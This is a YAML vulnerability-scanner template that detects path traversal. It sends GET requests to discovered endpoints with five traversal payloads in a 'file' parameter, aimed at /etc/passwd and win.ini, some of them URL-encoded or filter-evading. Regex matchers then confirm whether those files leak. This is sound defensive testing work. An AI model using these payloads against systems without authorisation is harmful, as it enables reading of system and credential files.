id: generic-path-traversal
info:
  name: Path Traversal
  description: Detects path traversal vulnerabilities in discovered endpoints
  owasp_category: A03:2025
  severity: high
  tags:
    - path-traversal
    - lfi
    - injection
    - generic

generic:
  endpoint: "{{all_discovered}}"
  method: GET
  parameter: "file"

  payloads:
    - "../../../etc/passwd"
    - "..\\..\\..\\..\\windows\\win.ini"
    - "....//....//....//etc/passwd"
    - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    - "....\\/....\\/....\\/etc/passwd"

  matchers:
    - type: regex
      condition: or
      regex:
        - "root:x:\\d+:\\d+:"
        - "\\[drivers\\]"
        - "for 16-bit app support"

  matchers_condition: or
